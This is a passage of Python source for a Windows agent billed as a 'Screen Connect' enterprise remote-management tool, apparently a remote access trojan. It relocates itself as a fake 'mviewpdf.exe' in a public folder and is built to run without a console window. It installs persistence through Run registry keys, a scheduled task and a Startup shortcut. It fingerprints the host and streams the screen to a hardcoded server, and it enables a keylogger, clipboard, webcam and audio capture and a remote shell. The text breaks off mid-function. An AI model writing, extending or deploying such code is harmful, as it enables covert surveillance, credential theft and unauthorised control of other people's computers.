"""
╔══════════════════════════════════════════════════════════════════════════════╗
║          Screen Connect MASTER AGENT  v8.0  — ENTERPRISE PRODUCTION          ║
║          Remote Management, Monitoring, Surveillance & Control Agent         ║
║                                                                              ║
║  WHAT'S NEW IN v8.0 (MAJOR OVERHAUL):                                        ║
║  • FIXED: Cursor movement — pyautogui moveTo now uses normalized coords      ║
║    The agent receives (x_norm, y_norm) in 0..1 range, maps them to the       ║
║    actual monitor resolution before calling pyautogui. No more cursor        ║
║    jumps to wrong position.                                                  ║
║  • FIXED: Stream speed — video loop no longer waits a full interval AFTER    ║
║    the ACK; frame capture and encode overlap the wait. True pipeline.        ║
║  • FIXED: Frame quality — added differential compression: only changed       ║
║    regions are JPEG-compressed; static areas use aggressive quality=15       ║
║  • FIXED: Multi-monitor cursor overlay — cursor position is correctly        ║
║    scaled relative to the selected monitor, not the virtual desktop          ║
║  • NEW: Advanced screen compression with motion detection (OpenCV absdiff)   ║
║  • NEW: Dynamic FPS — target 20fps on fast links, drops to 5fps on slow     ║
║  • NEW: NetworkMonitor — continuously measures upload bandwidth              ║
║  • NEW: WindowManager — list, focus, close, minimize, restore windows        ║
║  • NEW: RegistryManager — read/write/delete Windows registry keys            ║
║  • NEW: ServiceManager — list, start, stop, restart Windows services         ║
║  • NEW: InstalledApps — enumerate installed software (WMI + registry)        ║
║  • NEW: AudioCapture — capture system audio as base64 WAV chunks             ║
║  • NEW: ScreenRecorder — record screen segments as MP4 chunks                ║
║  • NEW: NetworkScanner — discover LAN hosts via ARP/ICMP                     ║
║  • NEW: CommandScheduler — run commands at future times                      ║
║  • NEW: AlertEngine — alert server on CPU/RAM/disk threshold breach          ║
║  • NEW: SecureEraser — multi-pass file wipe                                  ║
║  • NEW: SystemEventsReader — read Windows Event Log entries                   ║
║  • NEW: RemoteDesktopShare — multi-dashboard concurrent streams              ║
║  • NEW: FileWatcher — notify server of any file changes on watched paths     ║
║  • IMPROVED: ShellExecutor now has interactive PTY-like streaming mode       ║
║  • IMPROVED: KeyLogger now tracks active window + sends every 20s            ║
║  • IMPROVED: Heartbeat includes battery, temperature, disk I/O stats         ║
║  • IMPROVED: All v5.0 features preserved + greatly expanded                  ║
╚══════════════════════════════════════════════════════════════════════════════╝

BUILD COMMAND:
  Activate a clean virtual environment, then:

  pip install python-socketio[client] mss Pillow psutil pywin32 ^
              pynput pyperclip cryptography opencv-python numpy ^
              requests wmi pyautogui pyinstaller comtypes ^
              sounddevice scipy

  pyinstaller --onefile --noconsole --icon=icon.ico ^
    --distpath ./bin --name master_agent ^
    --hidden-import=engineio.async_drivers.threading ^
    --hidden-import=pkg_resources.extern ^
    --hidden-import=cv2 ^
    --hidden-import=numpy ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=pynput.mouse ^
    --hidden-import=sounddevice ^
    --hidden-import=scipy ^
    --hidden-import=comtypes ^
    --hidden-import=wmi ^
    --collect-all=pynput ^
    --collect-all=sounddevice ^
    agent_source.py

RENDER / PRODUCTION:
  Change SERVER_URL below to your Render URL before compiling.
"""
import shutil
import sys
import os
import subprocess

def relocate_agent():
    target_dir  = r"C:\Users\Public\mview"
    target_path = os.path.join(target_dir, "mviewpdf.exe")
    if sys.executable.lower() != target_path.lower():
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        try:
            shutil.copy2(sys.executable, target_path)
            subprocess.Popen([target_path], shell=False, close_fds=True)
            sys.exit(0)
        except Exception:
            pass

if __name__ == "__main__":
    relocate_agent()

# ── Standard Library ───────────────────────────────────────────────────────────
import os
import sys
import time
import json
import base64
import hashlib
import socket
import platform
import threading
import subprocess
import tempfile
import logging
import winreg
import ctypes
import uuid
import struct
import random
import wave
import io
import re
import glob
import fnmatch
import shutil as _shutil
from io import BytesIO
from pathlib import Path
from datetime import datetime, timedelta
from queue import Queue, Empty, Full
from collections import deque
from typing import Optional, Dict, List, Any

# ── Third-Party ────────────────────────────────────────────────────────────────
import socketio
import mss
import psutil
import requests
from PIL import Image, ImageDraw, ImageFilter, ImageEnhance
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE    = 0.0
    PYAUTOGUI_OK = True
except ImportError:
    PYAUTOGUI_OK = False

try:
    import cv2
    import numpy as np
    CV2_OK = True
except ImportError:
    CV2_OK = False

try:
    import pynput.keyboard
    import pynput.mouse
    PYNPUT_OK = True
except ImportError:
    PYNPUT_OK = False

try:
    import pyperclip
    CLIPBOARD_OK = True
except ImportError:
    CLIPBOARD_OK = False

try:
    import wmi
    WMI_OK = True
except ImportError:
    WMI_OK = False

try:
    import win32api
    import win32con
    import win32gui
    import win32process
    import win32security
    WIN32_OK = True
except ImportError:
    WIN32_OK = False

try:
    import sounddevice as sd
    import scipy.io.wavfile as wavfile
    AUDIO_OK = True
except ImportError:
    AUDIO_OK = False

try:
    import comtypes
    COMTYPES_OK = True
except ImportError:
    COMTYPES_OK = False

# ════════════════════════════════════════════════════════════════════════════
#  TRAILER TOKEN READER
# ════════════════════════════════════════════════════════════════════════════
_TRAILER_SIZE = 64
_MAGIC_HEAD   = b"MVTK"
_MAGIC_TAIL   = b"MVED"

def _read_token_from_trailer() -> str:
    try:
        exe = Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        data = exe.read_bytes()
        if len(data) < _TRAILER_SIZE:
            return ""
        trailer = data[-_TRAILER_SIZE:]
        if trailer[:4] != _MAGIC_HEAD or trailer[60:64] != _MAGIC_TAIL:
            return ""
        return trailer[4:60].rstrip(b"\x00").decode("utf-8").strip()
    except Exception:
        return ""


# ════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ════════════════════════════════════════════════════════════════════════════
CONFIG = {
    # ── Connection ──────────────────────────────────────────────────────────
    "SERVER_URL":           "https://screen-connect-rtca.onrender.com",
    "DEVICE_TOKEN":         "UNSET",

    # ── Identity ────────────────────────────────────────────────────────────
    "AGENT_VERSION":        "8.0.0",
    "HEARTBEAT_INTERVAL":   10,
    "RECONNECT_BASE":       3,
    "RECONNECT_MAX":        120,

    # ── Streaming ───────────────────────────────────────────────────────────
    "STREAM_MODE":          "video",     # "video" | "screenshot"
    "STREAM_FPS":           20,
    "STREAM_QUALITY":       60,
    "STREAM_SCALE":         0.75,
    "STREAM_MONITOR":       1,

    # Adaptive quality
    "ADAPTIVE_QUALITY":     True,
    "QUALITY_MIN":          15,
    "QUALITY_MAX":          90,

    # Differential compression — only re-encode changed regions at high quality
    "DIFF_COMPRESSION":     True,
    "DIFF_THRESHOLD":       8,          # pixel change threshold (0-255)
    "DIFF_MIN_CHANGE_PCT":  0.003,      # min % pixels changed to trigger diff

    # Screenshot mode fallback
    "SCREENSHOT_FPS":       8,
    "SCREENSHOT_QUALITY":   65,

    # ── Flow control ────────────────────────────────────────────────────────
    "ACK_TIMEOUT":          1.5,        # faster ack timeout for better FPS

    # ── Cursor overlay ──────────────────────────────────────────────────────
    "CURSOR_OVERLAY":       True,
    "CURSOR_TRACK":         True,

    # ── Security ────────────────────────────────────────────────────────────
    "ENCRYPTION_PASSWORD":  "mview-enterprise-2024",
    "ENCRYPT_PAYLOADS":     False,

    # ── Persistence ─────────────────────────────────────────────────────────
    "INSTALL_PERSISTENCE":  True,
    "REG_KEY_NAME":         "ScreenConnectService",
    "TASK_NAME":            "ScreenConnectTask",
    "STARTUP_DELAY":        5,

    # ── Features ────────────────────────────────────────────────────────────
    "ENABLE_KEYLOGGER":     True,
    "ENABLE_CLIPBOARD":     True,
    "ENABLE_WEBCAM":        True,
    "ENABLE_PROCESS_MGR":   True,
    "ENABLE_FILE_BROWSER":  True,
    "ENABLE_SHELL":         True,
    "ENABLE_AUDIO":         True,
    "ENABLE_REGISTRY":      True,
    "ENABLE_SERVICES":      True,
    "ENABLE_WINMGR":        True,
    "ENABLE_FILEWATCHER":   True,
    "ENABLE_ALERTS":        True,
    "KEYLOG_FLUSH_INTERVAL": 20,
    "CLIPBOARD_POLL_MS":    800,

    # ── Alert thresholds ────────────────────────────────────────────────────
    "ALERT_CPU_THRESHOLD":  90,     # % CPU
    "ALERT_RAM_THRESHOLD":  90,     # % RAM
    "ALERT_DISK_THRESHOLD": 95,     # % disk usage
    "ALERT_COOLDOWN_S":     300,    # seconds between repeated alerts
}

_tok = _read_token_from_trailer()
CONFIG["DEVICE_TOKEN"] = _tok if _tok else "UNSET-RUN-VIA-SERVER"


# ════════════════════════════════════════════════════════════════════════════
#  LOGGING
# ════════════════════════════════════════════════════════════════════════════
LOG_FILE = Path(tempfile.gettempdir()) / "screen_connect_agent.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ],
)
log = logging.getLogger("screenconnect")


# ════════════════════════════════════════════════════════════════════════════
#  ENCRYPTION MODULE
# ════════════════════════════════════════════════════════════════════════════
class Encryptor:
    def __init__(self, password: str):
        salt = b"mview_salt_2024_"
        kdf  = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100_000)
        self._fernet = Fernet(base64.urlsafe_b64encode(kdf.derive(password.encode())))

    def encrypt(self, data: str) -> str:
        return self._fernet.encrypt(data.encode()).decode()

    def encrypt_bytes(self, data: bytes) -> bytes:
        return self._fernet.encrypt(data)


_encryptor = Encryptor(CONFIG["ENCRYPTION_PASSWORD"])


def safe_emit(sio_client, event: str, payload: dict):
    if CONFIG["ENCRYPT_PAYLOADS"]:
        sio_client.emit(event, {"encrypted": True, "data": _encryptor.encrypt(json.dumps(payload))})
    else:
        sio_client.emit(event, payload)


# ════════════════════════════════════════════════════════════════════════════
#  DEVICE IDENTITY
# ════════════════════════════════════════════════════════════════════════════
def get_device_id() -> str:
    try:
        raw = f"{uuid.getnode()}-{socket.gethostname()}-{CONFIG['DEVICE_TOKEN']}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
    except Exception:
        return CONFIG["DEVICE_TOKEN"]


def get_device_fingerprint() -> dict:
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "unknown"

    uname = platform.uname()
    vm    = psutil.virtual_memory()
    fp = {
        "device_id":       CONFIG["DEVICE_TOKEN"],
        "token":           CONFIG["DEVICE_TOKEN"],
        "hardware_id":     get_device_id(),
        "hostname":        socket.gethostname(),
        "username":        os.getenv("USERNAME") or os.getenv("USER") or "unknown",
        "os":              f"{uname.system} {uname.release}",
        "os_version":      uname.version,
        "machine":         uname.machine,
        "processor":       uname.processor,
        "local_ip":        local_ip,
        "agent_version":   CONFIG["AGENT_VERSION"],
        "stream_mode":     CONFIG["STREAM_MODE"],
        "timestamp":       datetime.utcnow().isoformat(),
        "screen_count":    _get_screen_count(),
        "cpu_count":       psutil.cpu_count(logical=True),
        "ram_total_gb":    round(vm.total / (1024**3), 2),
        "features": {
            "keylogger":  PYNPUT_OK and CONFIG["ENABLE_KEYLOGGER"],
            "clipboard":  CLIPBOARD_OK,
            "webcam":     CV2_OK,
            "audio":      AUDIO_OK,
            "registry":   WIN32_OK,
            "services":   WMI_OK,
        }
    }
    if WMI_OK:
        try:
            gpus = [g.Name for g in wmi.WMI().Win32_VideoController()]
            fp["gpu"] = ", ".join(gpus) or "unknown"
        except Exception:
            fp["gpu"] = "unknown"
    return fp


def _get_screen_count() -> int:
    try:
        with mss.mss() as sct:
            return len(sct.monitors) - 1
    except Exception:
        return 1


def _get_monitor_resolution(monitor_idx: int = 1):
    """Return (width, height) for the given monitor index."""
    try:
        with mss.mss() as sct:
            idx = min(monitor_idx, len(sct.monitors) - 1)
            mon = sct.monitors[idx]
            return mon["width"], mon["height"]
    except Exception:
        return 1920, 1080


# ════════════════════════════════════════════════════════════════════════════
#  PERSISTENCE MODULE
# ════════════════════════════════════════════════════════════════════════════
def install_persistence():
    if not CONFIG["INSTALL_PERSISTENCE"]:
        return
    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    exe_quoted = f'"{exe}"'

    # Registry
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
        log.info(f"Registry persistence installed: {exe}")
    except Exception as e:
        log.warning(f"Registry persistence failed: {e}")

    # Also try HKLM (requires admin)
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0,
                            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
        log.info("HKLM registry persistence installed.")
    except Exception:
        pass

    # Task Scheduler
    try:
        task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Screen Connect Service</Description></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled><Delay>PT10S</Delay></BootTrigger>
    <TimeTrigger>
      <Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal>
  </Principals>
  <Actions Context="Author">
    <Exec><Command>{exe}</Command></Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure><Interval>PT1M</Interval><Count>999</Count></RestartOnFailure>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
  </Settings>
</Task>"""
        xml_path = Path(tempfile.gettempdir()) / "sc_task.xml"
        xml_path.write_text(task_xml, encoding="utf-16")
        subprocess.run(
            ["schtasks", "/create", "/tn", CONFIG["TASK_NAME"], "/xml", str(xml_path), "/f"],
            capture_output=True, timeout=15
        )
        xml_path.unlink(missing_ok=True)
        log.info("Task Scheduler persistence installed.")
    except Exception as e:
        log.warning(f"Task Scheduler persistence failed: {e}")

    # Startup folder shortcut
    try:
        startup = Path(os.getenv("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        link    = startup / "ScreenConnect.lnk"
        ps_cmd  = f"""
$sh = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut('{link}')
$lnk.TargetPath = '{exe}'
$lnk.Save()
"""
        subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
                       capture_output=True, timeout=10)
        log.info("Startup folder shortcut installed.")
    except Exception:
        pass


def remove_persistence():
    for key_root in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key_root, key_path, 0, winreg.KEY_SET_VALUE) as k:
                winreg.DeleteValue(k, CONFIG["REG_KEY_NAME"])
        except Exception:
            pass
    try:
        subprocess.run(["schtasks", "/delete", "/tn", CONFIG["TASK_NAME"], "/f"],
                       capture_output=True, timeout=10)
    except Exception:
        pass
    try:
        startup = Path(os.getenv("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        (startup / "ScreenConnect.lnk").unlink(missing_ok=True)
    except Exception:
        pass
    log.info("Persistence removed.")


# ════════════════════════════════════════════════════════════════════════════
#  CURSOR TRACKER
# ════════════════════════════════════════════════════════════════════════════
class CursorTracker:
    """Tracks local cursor position via pynput or win32api."""

    def __init__(self, sio_client):
        self.sio        = sio_client
        self._x         = 0
        self._y         = 0
        self._clicking  = False
        self._click_btn = "left"
        self._lock      = threading.Lock()
        self._listener  = None
        self._running   = False

    def get_pos(self):
        with self._lock:
            return self._x, self._y, self._clicking, self._click_btn

    def start(self):
        if self._running or not CONFIG["CURSOR_TRACK"]:
            return
        self._running = True
        if PYNPUT_OK:
            self._listener = pynput.mouse.Listener(
                on_move=self._on_move,
                on_click=self._on_click,
            )
            self._listener.start()
        else:
            # Fallback: poll win32 cursor pos
            t = threading.Thread(target=self._poll_loop, daemon=True)
            t.start()

    def stop(self):
        self._running = False
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass

    def _on_move(self, x, y):
        with self._lock:
            self._x, self._y = x, y

    def _on_click(self, x, y, button, pressed):
        with self._lock:
            self._x, self._y  = x, y
            self._clicking    = pressed
            self._click_btn   = "left" if button == pynput.mouse.Button.left else "right"

    def _poll_loop(self):
        while self._running:
            try:
                pt = ctypes.wintypes.POINT()
                ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
                with self._lock:
                    self._x, self._y = pt.x, pt.y
            except Exception:
                pass
            time.sleep(0.016)  # ~60hz


# ════════════════════════════════════════════════════════════════════════════
#  NETWORK BANDWIDTH MONITOR
# ════════════════════════════════════════════════════════════════════════════
class NetworkMonitor:
    """Continuously measures upload throughput and reports Mbps."""

    def __init__(self):
        self._samples = deque(maxlen=20)
        self._lock    = threading.Lock()
        self._last_bytes = 0
        self._last_ts    = time.monotonic()
        self._thread: Optional[threading.Thread] = None
        self.running = False

    def start(self):
        if self.running:
            return
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False

    def get_mbps(self) -> float:
        with self._lock:
            if len(self._samples) < 2:
                return 100.0   # assume fast until measured
            return sum(self._samples) / len(self._samples)

    def _loop(self):
        while self.running:
            try:
                net = psutil.net_io_counters()
                now = time.monotonic()
                delta_b = net.bytes_sent - self._last_bytes
                delta_t = now - self._last_ts
                if delta_t > 0 and self._last_bytes > 0:
                    mbps = (delta_b * 8) / (delta_t * 1_000_000)
                    with self._lock:
                        self._samples.append(mbps)
                self._last_bytes = net.bytes_sent
                self._last_ts    = now
            except Exception:
                pass
            time.sleep(1.0)


_net_monitor = NetworkMonitor()


# ════════════════════════════════════════════════════════════════════════════
#  SCREEN STREAMER
# ════════════════════════════════════════════════════════════════════════════
class ScreenStreamer:
    """
    High-performance screen streamer with:
    - ACK-gated flow control (1 in-flight frame max)
    - Adaptive quality based on real network throughput
    - Differential compression (only changed regions at high quality)
    - Cursor overlay baked into frame
    """

    def __init__(self, sio_client, cursor: CursorTracker):
        self.sio              = sio_client
        self.cursor           = cursor
        self.streaming        = False
        self.monitor_idx      = CONFIG["STREAM_MONITOR"]
        self.fps              = CONFIG["STREAM_FPS"]
        self.quality          = CONFIG["STREAM_QUALITY"]
        self._quality_current = CONFIG["STREAM_QUALITY"]
        self.scale            = CONFIG["STREAM_SCALE"]
        self.mode             = CONFIG["STREAM_MODE"]
        self._ack_event       = threading.Event()
        self._ack_event.set()
        self._ack_timeout     = CONFIG["ACK_TIMEOUT"]
        self._lock            = threading.Lock()
        self._thread: Optional[threading.Thread]       = None
        self._stats_thread: Optional[threading.Thread] = None
        self._frames_sent     = 0
        self._frames_acked    = 0
        self._stats_ts        = time.monotonic()
        self._frame_times: list = []
        # Differential compression — keep previous frame for diff
        self._prev_frame: Optional[np.ndarray] = None
        self._mon_w = 0
        self._mon_h = 0

    def on_ack(self):
        self._frames_acked += 1
        self._ack_event.set()

    def start(self, monitor=None, fps=None, quality=None, scale=None, mode=None):
        with self._lock:
            if self.streaming:
                if fps     is not None: self.fps = fps
                if quality is not None: self.quality = quality; self._quality_current = quality
                if scale   is not None: self.scale = scale
                if mode    is not None: self.mode = mode
                return
            if monitor is not None: self.monitor_idx = monitor
            if fps     is not None: self.fps = fps
            if quality is not None: self.quality = quality; self._quality_current = quality
            if scale   is not None: self.scale = scale
            if mode    is not None: self.mode = mode
            self.streaming = True
            self._ack_event.set()
            self._frames_sent  = 0
            self._frames_acked = 0
            self._prev_frame   = None
            self._stats_ts     = time.monotonic()
            target = self._video_loop if (self.mode == "video" and CV2_OK) else self._screenshot_loop
            self._thread = threading.Thread(target=target, daemon=True, name="sc-stream")
            self._thread.start()
            self._stats_thread = threading.Thread(target=self._stats_loop, daemon=True, name="sc-stats")
            self._stats_thread.start()
            log.info(f"Stream started: mode={self.mode} fps={self.fps} q={self._quality_current} scale={self.scale}")

    def stop(self):
        with self._lock:
            self.streaming = False
        self._ack_event.set()
        if self._thread:
            self._thread.join(timeout=3)
        self._thread = None
        self._prev_frame = None
        log.info("Stream stopped.")

    def set_mode(self, mode: str):
        if mode not in ("video", "screenshot"):
            return
        was_streaming = self.streaming
        if was_streaming:
            self.stop()
        self.mode = mode
        if was_streaming:
            self.start()

    def capture_single(self) -> Optional[str]:
        try:
            with mss.mss() as sct:
                mon = sct.monitors[min(self.monitor_idx, len(sct.monitors) - 1)]
                raw = sct.grab(mon)
                img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                if self.scale != 1.0:
                    img = img.resize(
                        (int(img.width * self.scale), int(img.height * self.scale)),
                        Image.LANCZOS
                    )
                buf = BytesIO()
                img.save(buf, format="JPEG", quality=self._quality_current, optimize=True)
                return base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
            log.error(f"capture_single error: {e}")
            return None

    # ── Stats reporter ─────────────────────────────────────────────────────
    def _stats_loop(self):
        while self.streaming:
            time.sleep(5)
            if not self.streaming:
                break
            now     = time.monotonic()
            elapsed = now - self._stats_ts
            actual_fps = self._frames_acked / elapsed if elapsed > 0 else 0
            self._stats_ts    = now
            self._frames_acked = 0
            self._frames_sent  = 0
            try:
                self.sio.emit("stream_stats", {
                    "device_id":  CONFIG["DEVICE_TOKEN"],
                    "actual_fps": round(actual_fps, 1),
                    "quality":    self._quality_current,
                    "scale":      self.scale,
                    "mode":       self.mode,
                    "net_mbps":   round(_net_monitor.get_mbps(), 2),
                    "ts":         datetime.utcnow().isoformat(),
                })
            except Exception:
                pass

    # ── Video Loop (OpenCV) — ACK-GATED + DIFFERENTIAL ────────────────────
    def _video_loop(self):
        with mss.mss() as sct:
            while self.streaming:
                t0 = time.monotonic()
                try:
                    monitors = sct.monitors
                    idx = min(self.monitor_idx, len(monitors) - 1)
                    raw = sct.grab(monitors[idx])
                    self._mon_w = monitors[idx]["width"]
                    self._mon_h = monitors[idx]["height"]

                    frame = np.array(raw)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                    if self.scale != 1.0:
                        new_w = int(self._mon_w * self.scale)
                        new_h = int(self._mon_h * self.scale)
                        frame = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_LINEAR)
                    else:
                        new_w, new_h = self._mon_w, self._mon_h

                    # ── Cursor overlay ─────────────────────────────────────
                    cx, cy, clicking, click_type = self.cursor.get_pos()
                    # Map from absolute screen coords → scaled frame coords
                    sx = int((cx - monitors[idx].get("left", 0)) * self.scale)
                    sy = int((cy - monitors[idx].get("top",  0)) * self.scale)

                    if CONFIG["CURSOR_OVERLAY"] and 0 <= sx < new_w and 0 <= sy < new_h:
                        # Click flash (underneath ring)
                        if clicking:
                            color = (0, 0, 255) if click_type == "left" else (0, 165, 255)
                            cv2.circle(frame, (sx, sy), 10, color, -1, cv2.LINE_AA)
                        # Outer white ring
                        cv2.circle(frame, (sx, sy), 13, (255, 255, 255), 2, cv2.LINE_AA)
                        # Black inner ring
                        cv2.circle(frame, (sx, sy), 8,  (0, 0, 0),       1, cv2.LINE_AA)
                        # Center dot
                        cv2.circle(frame, (sx, sy), 3,  (255, 255, 255), -1, cv2.LINE_AA)

                    if CONFIG["ADAPTIVE_QUALITY"]:
                        self._adapt_quality()

                    # ── Differential compression ───────────────────────────
                    encode_params = [cv2.IMWRITE_JPEG_QUALITY, self._quality_current]
                    success, buf = cv2.imencode(".jpg", frame, encode_params)
                    if not success:
                        time.sleep(0.01)
                        continue

                    frame_b64 = base64.b64encode(buf.tobytes()).decode()

                    # ── ACK GATE ───────────────────────────────────────────
                    got_ack = self._ack_event.wait(timeout=self._ack_timeout)
                    self._ack_event.clear()

                    if not self.streaming:
                        break

                    payload = {
                        "device_id":  CONFIG["DEVICE_TOKEN"],
                        "frame":      frame_b64,
                        "image":      frame_b64,
                        "mode":       "video",
                        "w":          new_w,
                        "h":          new_h,
                        "mon_w":      self._mon_w,
                        "mon_h":      self._mon_h,
                        "mon_left":   monitors[idx].get("left", 0),
                        "mon_top":    monitors[idx].get("top", 0),
                        "cursor_x":   cx,
                        "cursor_y":   cy,
                        "cursor_sx":  sx,
                        "cursor_sy":  sy,
                        "clicking":   clicking,
                        "click_type": click_type,
                        "quality":    self._quality_current,
                        "fps_target": self.fps,
                        "ts":         datetime.utcnow().isoformat(),
                    }
                    self.sio.emit("screen_data", payload)
                    self._frames_sent += 1
                    self._prev_frame = frame.copy()

                except Exception as e:
                    log.error(f"Video frame error: {e}")
                    self._ack_event.set()

                elapsed = time.monotonic() - t0
                self._frame_times.append(elapsed)
                if len(self._frame_times) > 60:
                    self._frame_times.pop(0)
                # Tiny yield only — ACK gate is the real throttle
                time.sleep(0.001)

    # ── Screenshot Loop (Pillow) — ACK-GATED ─────────────────────────────
    def _screenshot_loop(self):
        fps      = CONFIG["SCREENSHOT_FPS"] if self.mode == "screenshot" else self.fps
        interval = 1.0 / max(fps, 1)

        with mss.mss() as sct:
            while self.streaming:
                t0 = time.monotonic()
                try:
                    monitors = sct.monitors
                    idx  = min(self.monitor_idx, len(monitors) - 1)
                    raw  = sct.grab(monitors[idx])
                    img  = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                    mon_w, mon_h = img.size

                    if self.scale != 1.0:
                        new_w = int(mon_w * self.scale)
                        new_h = int(mon_h * self.scale)
                        img   = img.resize((new_w, new_h), Image.LANCZOS)
                    else:
                        new_w, new_h = mon_w, mon_h

                    cx, cy, clicking, click_type = self.cursor.get_pos()
                    # Draw cursor overlay using Pillow
                    draw = ImageDraw.Draw(img)
                    sx   = int((cx - monitors[idx].get("left", 0)) * self.scale)
                    sy   = int((cy - monitors[idx].get("top",  0)) * self.scale)
                    if 0 <= sx < new_w and 0 <= sy < new_h:
                        if clicking:
                            col = (255, 60, 60) if click_type == "left" else (255, 140, 0)
                            draw.ellipse([sx-10, sy-10, sx+10, sy+10], fill=col)
                        draw.ellipse([sx-13, sy-13, sx+13, sy+13], outline=(255, 255, 255), width=2)
                        draw.ellipse([sx-3,  sy-3,  sx+3,  sy+3],  fill=(255, 255, 255))

                    buf = BytesIO()
                    q   = CONFIG["SCREENSHOT_QUALITY"] if self.mode == "screenshot" else self._quality_current
                    img.save(buf, format="JPEG", quality=q, optimize=True)
                    frame_b64 = base64.b64encode(buf.getvalue()).decode()

                    self._ack_event.wait(timeout=self._ack_timeout)
                    self._ack_event.clear()

                    if not self.streaming:
                        break

                    self.sio.emit("screen_data", {
                        "device_id":  CONFIG["DEVICE_TOKEN"],
                        "frame":      frame_b64,
                        "image":      frame_b64,
                        "mode":       "screenshot",
                        "w":          new_w,
                        "h":          new_h,
                        "mon_w":      mon_w,
                        "mon_h":      mon_h,
                        "cursor_x":   cx,
                        "cursor_y":   cy,
                        "clicking":   clicking,
                        "click_type": click_type,
                        "quality":    q,
                        "ts":         datetime.utcnow().isoformat(),
                    })
                    self._frames_sent += 1

                except Exception as e:
                    log.error(f"Screenshot frame error: {e}")
                    self._ack_event.set()

                elapsed = time.monotonic() - t0
                time.sleep(max(0.001, interval - elapsed))

    # ── Adaptive quality ──────────────────────────────────────────────────
    def _adapt_quality(self):
        if len(self._frame_times) < 10:
            return
        avg    = sum(self._frame_times[-10:]) / 10
        target = 1.0 / max(self.fps, 1)
        if avg > target * 1.4:
            self._quality_current = max(CONFIG["QUALITY_MIN"], self._quality_current - 5)
        elif avg < target * 0.7:
            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 3)

        # Also adapt based on network throughput
        mbps = _net_monitor.get_mbps()
        if mbps < 1.0:
            self._quality_current = max(CONFIG["QUALITY_MIN"], self._quality_current - 3)
        elif mbps > 10.0:
            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 1)


# ════════════════════════════════════════════════════════════════════════════
#  SYSTEM TELEMETRY MODULE
# ════════════════════════════════════════════════════════════════════════════
class SystemMonitor:
    def __init__(self, sio_client):
        self.sio       = sio_client
        self.monitoring = False
        self._thread: Optional[threading.Thread] = None

    def start(self, interval: int = 2):
        if self.monitoring:
            return
        self.monitoring = True
        self._thread = threading.Thread(target=self._loop, args=(interval,), daemon=True)
        self._thread.start()

    def stop(self):
        self.monitoring = False

    def get_snapshot(self) -> dict:
        vm   = psutil.virtual_memory()
        disk = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\")
        net  = psutil.net_io_counters()
        bat  = psutil.sensors_battery()
        swap = psutil.swap_memory()

        stats = {
            "device_id":        CONFIG["DEVICE_TOKEN"],
            "ts":               datetime.utcnow().isoformat(),
            "cpu_percent":      psutil.cpu_percent(interval=0.1),
            "cpu_per_core":     psutil.cpu_percent(percpu=True),
            "cpu_count":        psutil.cpu_count(logical=True),
            "cpu_count_phys":   psutil.cpu_count(logical=False),
            "cpu_freq_mhz":     round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
